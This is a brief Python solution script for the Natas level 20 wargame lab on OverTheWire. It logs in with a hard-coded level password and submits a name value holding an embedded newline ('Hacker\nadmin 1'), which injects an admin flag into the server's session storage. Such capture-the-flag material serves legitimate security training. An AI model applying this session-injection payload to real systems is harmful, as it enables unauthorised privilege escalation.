#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'
url = 'http://%s.natas.labs.overthewire.org/?debug=true' %username

#Functions
session = requests.Session()

response = session.get(url, auth = (username, password))
print(response.text)
print("=" * 80)

response = session.post(url, auth = (username, password), data = {"name": "Hacker\nadmin 1"})
print(response.text)
print("=" * 80)

response = session.get(url, auth = (username, password))
print(response.text)
print("=" * 80)